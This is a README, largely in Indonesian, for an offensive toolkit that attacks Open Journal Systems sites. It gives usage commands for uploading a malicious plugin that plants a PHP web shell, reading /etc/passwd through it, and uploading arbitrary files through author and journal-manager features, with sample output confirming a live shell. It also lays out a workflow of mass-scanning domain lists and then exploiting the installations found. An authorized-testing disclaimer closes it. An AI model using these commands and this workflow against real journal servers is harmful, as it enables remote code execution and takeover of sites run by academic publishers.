# OJS Exploit Toolkit

**Author:** [@shootcannon](https://github.com/shootcannon)  
**Target:** Open Journal Systems (OJS) — PKP Platform  
**Language:** Python 3.10+  
**For authorized bug bounty / penetration testing only.**

---

## Modules

| Module | Command | Akses Dibutuhkan | Risiko |
|---|---|---|---|
| Plugin RCE | `plugin` | Admin / Site Admin | RCE via malicious plugin ZIP |
| Submission Upload | `submission` | Author (registrasi publik) | Upload file arbitrary via galley |
| Journal Manager Upload | `jmupload` | Journal Manager | Upload cover / stylesheet |

---

## Requirements

```bash
pip install httpx colorama
```

---

## Usage

### 1. Plugin Upload -> RCE

Upload plugin ZIP berisi PHP shell ke endpoint admin, lalu eksekusi command.

```bash
python ojs_exploit.py plugin https://target.com -u admin -p password123
```

```bash
# Custom command
python ojs_exploit.py plugin https://target.com -u admin -p password123 --cmd "cat /etc/passwd"
```

**Alur:**
1. Login sebagai admin
2. Build plugin ZIP otomatis (berisi `shell.php`)
3. Upload via `/index.php/index/management/plugin`
4. Akses shell di `/plugins/generic/ShellPlugin/shell.php?cmd=<perintah>`

---

### 2. Article Submission Upload

Upload file arbitrary via fitur submission artikel (author role — bisa self-register).

```bash
python ojs_exploit.py submission https://target.com -u author -p pass -f shell.php -j namajournal
```

| Flag | Keterangan |
|---|---|
| `-u` | Username author |
| `-p` | Password |
| `-f` | Path file yang diupload |
| `-j` | Slug journal (lihat URL: `/index.php/**slug**/about`) |

---

### 3. Journal Manager Upload

Upload file via fitur cover image / stylesheet journal manager.

```bash
python ojs_exploit.py jmupload https://target.com -u jmanager -p pass -f file.php -j namajournal
```

---

## Mencari Journal Slug

Slug journal bisa dilihat dari URL OJS target:

```
https://target.com/index.php/[SLUG]/about
https://target.com/index.php/[SLUG]/issue/current
```

Gunakan `index` jika tidak ada slug khusus (single-journal install).

---

## Output

```
[*] Target  : https://target.com
[*] Module  : Plugin Upload RCE
[+] Login berhasil sebagai admin
[+] Plugin page ditemukan: https://target.com/index.php/index/management/plugin
[+] Plugin mungkin berhasil diupload
[+] SHELL AKTIF: https://target.com/plugins/generic/ShellPlugin/shell.php
[+] Output cmd 'id':

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Companion Tool

| File | Fungsi |
|---|---|
| `ojs_scanner.py` | Mass scan domain untuk deteksi instalasi OJS & versi |
| `ojs_exploit.py` | Eksploitasi OJS yang ditemukan scanner |

**Workflow:**
```bash
# 1. Scan dulu
python ojs-scanner.py domains.txt -o hasil.csv -c 50

# 2. Exploit target yang ditemukan
python ojs-exploit.py plugin https://target.com -u admin -p pass
```

---

## Disclaimer

Tool ini dibuat untuk keperluan **bug bounty**, **CTF**, dan **authorized penetration testing**.  
Penggunaan tanpa izin tertulis dari pemilik sistem adalah ilegal.  
Penulis tidak bertanggung jawab atas penyalahgunaan tool ini.
